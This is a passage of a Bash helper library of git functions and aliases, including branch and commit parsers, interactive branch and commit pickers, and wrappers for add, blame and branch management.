        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    command="git show-ref --heads --quiet main && echo main || echo master"

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi

    eval "${command}"
}

#--------------------------------------------------
# git aliases
#--------------------------------------------------

alias what='_echo_info "git whatchanged -p --abbrev-commit --pretty=medium\n"; git whatchanged -p --abbrev-commit --pretty=medium' ## Print changes from every commit

## Check cherry-pick is in progress
function _is_cherry_pick_in_progress() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_is_cherry-pick_in_progress -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local verbose=false

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :vh option; do
        case "${option}" in
            v) verbose=true;;
            h) _echo_warning '_is_cherry_pick_in_progress\n';
                _echo_success 'description:' 2 14; _echo_primary 'Check cherry-pick is in progress\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "test -f \"$(git rev-parse --git-dir)/CHERRY_PICK_HEAD\"\n"
    fi

    if [ -f "$(git rev-parse --git-dir)/CHERRY_PICK_HEAD" ]; then
        echo true
        return 0
    fi

    echo false
}

## Check rebase is in progress
function _is_rebase_in_progress() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_is_rebase_in_progress -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local verbose=false

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :vh option; do
        case "${option}" in
            v) verbose=true;;
            h) _echo_warning '_is_rebase_in_progress\n';
                _echo_success 'description:' 2 14; _echo_primary 'Check rebase is in progress\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        _echo_info "test -d \"$(git rev-parse --git-dir)/rebase-merge\" || test -d \"$(git rev-parse --git-dir)/rebase-apply\"\n"
    fi

    if [ -d "$(git rev-parse --git-dir)/rebase-merge" ] || [ -d "$(git rev-parse --git-dir)/rebase-apply" ]; then
        echo true
        return 0
    fi

    echo false
}

# Check branch is valid
function _check_branch_is_valid() {
    if [[ "$1" =~ ^[0-9a-zA-Z/_-]+$ ]]; then
        echo true
        return 0
    fi
    echo false
}

#--------------------------------------------------

# Parse branch type, eg: feat/FOO-01/foobar => fix
function _parse_branch_type() {
    echo -n "$1" | sed -nE 's/^(build|chore|ci|docs|feat|fix|perf|refactor|style|test)\/.+/\1/p'
}

# Parse branch ticket, eg: feat/FOO-01/foobar => FOO-01
function _parse_branch_ticket() {
    echo -n "$1" | sed -nE 's/^.+\/([A-Z]+-[0-9]+)\/.+/\1/p'
}

# Parse branch subject, eg: feat/FOO-01/foobar => foobar
function _parse_branch_subject() {
    # remove type and ticket from subject
    echo -n "$1" | sed -E 's/^(build|chore|ci|docs|feat|fix|perf|refactor|style|test)\///' | sed -E 's/[A-Z]+-[0-9]+\///'
}

#--------------------------------------------------

# Get branch type
function _get_branch_type() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    _parse_branch_type "$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"
}

# Get branch ticket
function _get_branch_ticket() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    _parse_branch_ticket "$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"
}

# Get branch subject
function _get_branch_subject() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    _parse_branch_subject "$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"
}

# Check commit hash is valid
function _check_commit_is_valid() {
    if [[ "$1" =~ ^([0-9a-f]+|HEAD)(~[0-9]+)?$ ]]; then
        echo true
        return 0
    fi
    echo false
}

#--------------------------------------------------

# Parse commit type, eg: feat(foobar): FooBar (FOO-01) => feat
function _parse_commit_type() {
    echo -n "$1" | awk -F '[^a-z_]' '/^[a-z()_]*!?: /{print $1}'
}

# Parse commit scope, eg: feat(foobar): FooBar (FOO-01) => foobar
function _parse_commit_scope() {
    # Check awk installation
    if [ ! -x "$(command -v awk)" ]; then
        _echo_danger 'error: awk required, enter: "sudo apt-get install -y awk" to install\n'
        return 1
    fi

    echo -n "$1" | awk -F '[^a-z_-]' '/^[a-z()_-]*!?: /{print $2}'
}

# Parse commit subject, eg: feat(foobar): FooBar (FOO-01) => FooBar
function _parse_commit_subject() {
    # remove type ,scope, ticket and pull request from subject
    echo -n "$1" | sed -E 's/^[a-z()_]+!?: //' | sed -E 's/\([A-Z]+-[0-9]+\)//g' | sed -E 's/\(#\d+\)//g' | tr -s ' ' | sed -E 's/ +$//'
}

# Parse commit ticket, eg: feat(foobar): FooBar (FOO-01) => FOO-01
function _parse_commit_ticket() {
    echo -n "$1" | sed -nE 's/.*\(([A-Z]+-[0-9]+)\).*/\1/p'
}

# Parse commit pull request, eg: feat(foobar): FooBar (FOO-01) (#4321) => 4321
function _parse_commit_pull_request() {
    echo -n "$1" | sed -nE 's/.*\(#([0-9]+)\).*/\1/p'
}

#--------------------------------------------------

# Get commit type
function _get_commit_type() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    local TYPE

    TYPE=$(_get_branch_type)
    if [ -n "${TYPE}" ]; then
        echo -n "${TYPE}"
        return 0
    fi

    # https://git-scm.com/docs/pretty-formats/2.21.0
    _parse_commit_type "$(git --no-pager log -1 --pretty="format:%s")"
}

# Get commit scope
function _get_commit_scope() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    # https://git-scm.com/docs/pretty-formats/2.21.0
    _parse_commit_scope "$(git --no-pager log -1 --pretty="format:%s")"
}

# Get commit subject
function _get_commit_subject() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    # https://git-scm.com/docs/pretty-formats/2.21.0
    # remove type and scope from subject
    _parse_commit_subject "$(git --no-pager log -1 --pretty="format:%s")"
}

# Get commit ticket
function _get_commit_ticket() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    local TICKET

    TICKET=$(_get_branch_ticket)
    if [ -n "${TICKET}" ]; then
        echo -n "${TICKET}"
        return 0
    fi

    # https://git-scm.com/docs/pretty-formats/2.21.0
    _parse_commit_ticket "$(git --no-pager log -1 --pretty="format:%s")"
}

# Get commit pull request
function _get_commit_pull_request() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    # https://git-scm.com/docs/pretty-formats/2.21.0
    _parse_commit_pull_request "$(git --no-pager log -1 --pretty="format:%s")"
}

# Get commit body
function _get_commit_body() {
    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    # https://git-scm.com/docs/pretty-formats/2.21.0
    _trim "$(git --no-pager log -1 --pretty="format:%b")"
}

## Select a branch among multiple options
function _pick_branch() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_pick_branch -F [file type filter] -a (list all) -m (list main) -c (list current) -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local branches=()
    local command
    local current_branch
    local filter
    local list_all=false
    local list_current=false
    local list_main=false
    local main_branch
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :acF:mvh option; do
            case "${option}" in
                a) list_all=true;;
                c) list_current=true;;
                F) filter="${OPTARG}";;
                m) list_main=true;;
                v) verbose=true;;
                h) _echo_warning '_pick_branch\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Select a branch among multiple options\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 0 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    main_branch="$(_get_main_branch)"
    current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"

    #--------------------------------------------------

    # main branch and current branch always first options
    if [ "${current_branch}" != "${main_branch}" ] && [ "${list_main}" = true ]; then
        branches+=("${main_branch}")
    fi

    if [ "${list_current}" = true ]; then
        branches+=("${current_branch}")
    fi

    #--------------------------------------------------

    command='git --no-pager branch --format="%(refname:short)"'

    if [ "${list_all}" = true ]; then
        command='git --no-pager branch --all --format="%(refname:short)"'
    fi

    if [ -n "${filter}" ]; then
        command="${command} | grep ${filter}"
    fi

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi

    #--------------------------------------------------

    # select local branches with options
    while IFS='' read -r line; do
        # remove "origin" prefix
        line="$(echo "${line}" | sed 's/^origin\///')"
        if ! echo "${line}" | grep -qE "^(${main_branch}|${current_branch}|HEAD)$"; then
            branches+=("${line}")
        fi
    done < <(eval "${command}")

    if [ -z "${branches[${LBOUND}]}" ]; then
        _echo_danger 'error: No branches found\n'
        return 1;
    fi

    #--------------------------------------------------

    PS3=$(_echo_success 'Please select branch : ')
    select branch in "${branches[@]}"; do
        # validate selection
        for item in "${branches[@]}"; do
            # find selected container
            if [[ "${item}" == "${branch}" ]]; then
                # break two encapsulation levels
                break 2;
            fi
        done
    done

    echo -n "${branch}"
}

## Select a commit among multiple options
function _pick_commit() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_pick_commit (branch) -n [count] -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local command
    local commit_hash
    local commits=()
    local max_count=16
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :n:vh option; do
            case "${option}" in
                n) max_count="${OPTARG}";;
                v) verbose=true;;
                h) _echo_warning '_pick_commit\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Select a commit among multiple options\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # branch is the only accepted argument
    branch="${arguments[${LBOUND}]}"

    #--------------------------------------------------

    if [ -z "${branch}" ]; then
        # lists commits from current branch by default
        command="git --no-pager log --no-decorate --oneline -n ${max_count} 2>/dev/null"
    else
        command="git --no-pager log ${branch} --no-decorate --oneline -n ${max_count} 2>/dev/null"
    fi

    if [ "${verbose}" = true ]; then
        _echo_info "${command}\n"
    fi

    #--------------------------------------------------

    # select commit hashes
    while IFS='' read -r line; do
        commits+=("${line}");
    done < <(eval "${command}")

    if [ -z "${commits[${LBOUND}]}" ]; then
        _echo_danger 'error: No commits found\n'
        return 1;
    fi

    PS3=$(_echo_success 'Please select commit : ')
    select commit_hash in "${commits[@]}"; do
        # validate selection
        for ITEM in "${commits[@]}"; do
            # find selected hash
            if [[ "${ITEM}" == "${commit_hash}" ]]; then
                # get fully qualified hash
                commit_hash="$(git --no-pager show -q --no-decorate "$(echo "${commit_hash}" | cut -d' ' -f1)" | head -n1 | cut -d' ' -f2)"
                # break two encapsulation levels
                break 2;
            fi
        done
    done

    #--------------------------------------------------
    # Return result
    #--------------------------------------------------

    echo -n "${commit_hash}"
}

## Select a repository among multiple options
function _pick_repository() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary '_pick_repository [user_name] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local owner
    local repositories=()

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning '_pick_repository\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Select a repository among multiple options\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check curl installation
    #--------------------------------------------------

    if [ ! -x "$(command -v curl)" ]; then
        _echo_danger 'error: curl required, enter: "sudo apt-get install -y curl" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ ${#arguments[@]} -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    owner="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    if [ -z "${owner}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Pick repository
    #--------------------------------------------------

    # select repositories
    while IFS='' read -r line; do
        # copy command result to "repositories" array
        repositories+=("${line}");
    done < <(list-github "${owner}")

    if [ "${#repositories[@]}" -eq 0 ]; then
        _echo_danger 'error: No repositorys found\n'
        return 1;
    fi

    PS3=$(_echo_success 'Please select repository : ')
    select repository in "${repositories[@]}"; do
        # validate selection
        for item in "${repositories[@]}"; do
            # find selected hash
            if [[ "${item}" == "${repository}" ]]; then
                # break two encapsulation levels
                break 2;
            fi
        done
    done

    #--------------------------------------------------
    # Return result
    #--------------------------------------------------

    echo -n "${repository}"
}

# Print Jira url
function _print_jira_url() {
    echo -n "https://${JIRA_SERVER}/browse/$1"
}

## Stage files to git index
function add() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'add (files) -F [file type filter] -p (patch) -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local command='git add'
    local file
    local filter
    local patch=false
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :F:pvh option; do
            case "${option}" in
                F) filter="${OPTARG}";;
                p) patch=true;;
                v) verbose=true;;
                h) _echo_warning 'add\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Stage files to git index\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    if [ "${patch}" = true ]; then
        command="${command} --patch"
    fi

    #--------------------------------------------------
    # Print infos
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        guser
        echo
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ "${#arguments[@]}" -eq 0 ] && [ -z "${filter}" ]; then
        _echo_info "${command} .\n"
        eval "${command} ."
    else
        for file in "${arguments[@]}"
        do
            _echo_info "${command} ${file}\n"
            eval "${command} ${file}"
        done
        if [ -n "${filter}" ]; then
            for file in $(git --no-pager diff --name-only "${filter}")
            do
                _echo_info "${command} ${file}\n"
                eval "${command} ${file}"
            done
        fi
    fi

    #--------------------------------------------------
    # Print infos
    #--------------------------------------------------

    if [ "${verbose}" = true ]; then
        echo
        lremote
        branch -l
        gstatus
    fi
}

#--------------------------------------------------
# git aliases
#--------------------------------------------------

alias glp='git log --pretty=format:"%C(yellow)%h%C(reset) - %C(green)%an%C(reset), %ar : %s"' ## Pretty Git Log

# Amend last commit message, author and date
function amend() {
    conventional-commit -X "$@"
}

## Show what revision and author last modified each line of a file
function blame() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'blame [file path] -c [commit hash] -n [number] -B (pick branch) -C (pick commit) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local command
    local commit_hash
    local file_path
    local number
    local pick_branch=false
    local pick_commit=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :123456789Bc:Cn:h option
        do
            case "${option}" in
                [1-9]) number="${option}";;
                B) pick_branch=true;;
                c) commit_hash="${OPTARG}";;
                C) pick_commit=true;;
                n) number="${OPTARG}";;
                h) _echo_warning 'show\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Show what revision and author last modified each line of a file\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    file_path="${arguments[${LBOUND}]}"

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

    # ignored when "commit hash" argument set
    if [ "${pick_branch}" = true ] && [ -z "${commit_hash}" ] && [ -z "${branch}" ]; then
        branch="$(_pick_branch -m)"
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    # ignored when "commit hash" argument set
    if [ "${pick_commit}" = true ] && [ -z "${commit_hash}" ]; then
        commit_hash=$(_pick_commit "${branch}")
    fi
    # shellcheck disable=2181
    if [ $? != 0 ]; then
        return 1
    fi

    #--------------------------------------------------
    # Validate values
    #--------------------------------------------------

    # Argument could be a branch name or a commit hash
    if [ -n "${commit_hash}" ]; then
        if [ "$(_commit_exists "${arguments[${LBOUND}]}")" = false ]; then
            _echo_danger "error: Invalid commit hash : \"${OBJECT}\"\n"
            _usage
            return 1
        fi
    fi

    if [ -n "${number}" ]; then
        if [ "${number}" -lt 1 ] || [[ ! "${number}" =~ ^[0-9]+$ ]]; then
            _echo_danger 'error: "number" should be a positive integer\n'
            _usage
            return 1
        fi
    fi

    if [ ! -f "${file_path}" ]; then
        _echo_danger "error: \"${file_path}\" file not found\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Set default value
    #--------------------------------------------------

    if [ -z "${commit_hash}" ]; then
        commit_hash=HEAD
    fi

    #--------------------------------------------------
    # Build command
    #--------------------------------------------------

    if [ "${number}" -gt 1 ]; then
        if [ -n "${commit_hash}" ]; then
            commit_hash="${commit_hash}~$((number - 1))"
        fi
        if [ -n "${branch}" ]; then
            branch="${branch}~$((number - 1))"
        fi
    fi

    command='git blame'

    if [ -n "${branch}" ]; then
        command="${command} ${branch}"

    elif [ "${commit_hash}" != 'HEAD' ]; then
        command="${command} ${commit_hash}"
    fi

    command="${command} --color-by-age --color-lines -- \"${file_path}\""

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    _echo_info "$(echo "${command}" | tr -s ' ')\n"
    eval "${command}"
}

alias gb='branch' ## Create, checkout, rename or delete git branch

## Create, checkout, rename or delete git branch
function branch() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'branch (name) -F [file type filter] -i (interactive) -l (list) -a (list all) -f (fetch) -p (prune) -d (delete) -D (delete remote) -r (rename) -u (set upstream) -A (all, fetch and prune) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local branch
    local checkout=true
    local command
    local current_branch
    local delete=false
    local delete_remote=false
    local fetch=false
    local filter
    local interactive_rename=false
    local list=false
    local list_all=false
    local prune=false
    local rename=false
    local set_upstream=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :aAdDfF:ilpruh option; do
            case "${option}" in
                a) list_all=true;;
                A) list_all=true;fetch=false;prune=true;;
                d) delete=true;checkout=false;;
                D) delete=true;delete_remote=true;checkout=false;;
                f) fetch=true;;
                F) filter="${OPTARG}";;
                i) interactive_rename=true;;
                l) list=true;checkout=false;;
                p) prune=true;;
                r) rename=true;set_upstream=true;checkout=false;;
                u) set_upstream=true;checkout=false;;
                h) _echo_warning 'branch\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create, checkout, rename or delete branch\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check git installation
    #--------------------------------------------------

    if [ ! -x "$(command -v git)" ]; then
        _echo_danger 'error: git required, enter: "sudo apt-get install -y git" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # check git directory
    #--------------------------------------------------

    if [ -z "$(git rev-parse --show-toplevel 2>/dev/null)" ]; then
        _echo_danger 'error: Not a git repository (or any of the parent directories)\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    branch="${arguments[${LBOUND}]}"

    #--------------------------------------------------

    if [ "${interactive_rename}" = true ] && [ "${rename}" = false ]; then
        checkout=true
    fi

    if [ "${fetch}" = true ]; then
        fetch
    fi

    if [ "${prune}" = true ]; then
        fetch -p
    fi

    #--------------------------------------------------

    # listing branches when branch name empty (set upstream implies current branch)
    if [ "${list}" = true ] && [ "${set_upstream}" = false ]; then
        if [ "${list_all}" = true ]; then
            _echo_info 'git --no-pager branch -avv\n'
            git --no-pager branch -avv
        else
            _echo_info 'git --no-pager branch -vv\n'
            git --no-pager branch -vv
        fi
        return 0
    fi

    #--------------------------------------------------

    # rename current branch
    if [ "${rename}" = true ]; then
        if [ "${interactive_rename}" = true ]; then
            conventional-branch -i -r "${branch}"
        else
            conventional-branch -r "${branch}"
        fi
    fi

    current_branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null)"

    #--------------------------------------------------

    # set upstream to track current branch (after a rename)
    if [ "${set_upstream}" = true ]; then
        # get current branch name
        _echo_info "git branch --set-upstream-to=\"origin/${current_branch}\"\n"
        git branch --set-upstream-to="origin/${current_branch}"
        branch="${current_branch}"
    fi

    #--------------------------------------------------
    # Iteractive pick
    #--------------------------------------------------

